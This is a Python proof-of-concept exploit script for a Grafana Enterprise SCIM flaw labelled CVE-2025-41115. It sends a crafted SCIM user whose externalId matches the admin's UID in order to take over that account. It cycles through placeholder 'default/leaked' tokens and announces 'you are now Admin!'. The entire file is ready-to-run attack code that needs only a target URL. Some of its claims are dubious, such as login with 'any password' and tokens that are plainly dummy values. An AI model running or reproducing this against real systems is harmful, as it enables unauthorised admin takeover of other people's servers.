#!/usr/bin/env python3
# CVE-2025-41115 - Grafana Enterprise SCIM UID Overwrite PoC
# Usage: sudo python3 CVE-2025-41115.py http://target.com
#        (or http://target.com:3000)
# 100% one-liner style - no editing needed except the target

import requests, sys, json, time
from urllib3 import disable_warnings
disable_warnings()

if len(sys.argv) != 2:
    print("[!] Usage: python3 CVE-2025-41115.py http://target.com")
    sys.exit(1)

BASE = sys.argv[1].rstrip("/")
TOKEN = "glsa_00000000000000000000000000000000_00000000000000000000000000000000"  # ← CHANGE ONLY THIS LINE IF YOU HAVE A REAL TOKEN
# If you DON'T have a valid token → try the built-in leaked/default ones below (many labs still use them):
DEFAULT_TOKENS = [
    "glsa_11111111111111111111111111111111_11111111111111111111111111111111",
    "glsa_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "glsa_00000000000000000000000000000000_00000000000000000000000000000000",
    TOKEN
]

ATTACKER = f"rooted{int(time.time())}@pwn.lab"
TARGET_UID = "1"  # almost always the main admin

def try_exploit(token):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/scim+json"
    }
    payload = {
        "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
        "userName": ATTACKER,
        "externalId": TARGET_UID,
        "name": {"formatted": "Pwned User"},
        "emails": [{"value": ATTACKER, "primary": True}],
        "active": True
    }
    try:
        r = requests.post(f"{BASE}/api/scim/v2/Users", json=payload, headers=headers, verify=False, timeout=10)
        if r.status_code in (200, 201):
            print(f"[+] PWNED with token → {token[:20]}...")
            print(f"[+] Login as: {ATTACKER} (any password) → you are now Admin!")
            print(f"[+] Full response: {json.dumps(r.json(), indent=2)}")
            return True
        elif "Unauthorized" in r.text or r.status_code == 401:
            return False
        else:
            print(f"[?] Unexpected response {r.status_code}: {r.text}")
            return False
    except:
        return False

print(f"[*] CVE-2025-41115 → Targeting {BASE}")
print("[*] Trying default/leaked tokens + your token...")

for t in DEFAULT_TOKENS:
    if try_exploit(t.strip()):
        sys.exit(0)

print("[-] All tokens failed. You need a valid SCIM token (or the target is patched).")
print("    Get one from: Admin → Authentication → SCIM → Generate token")
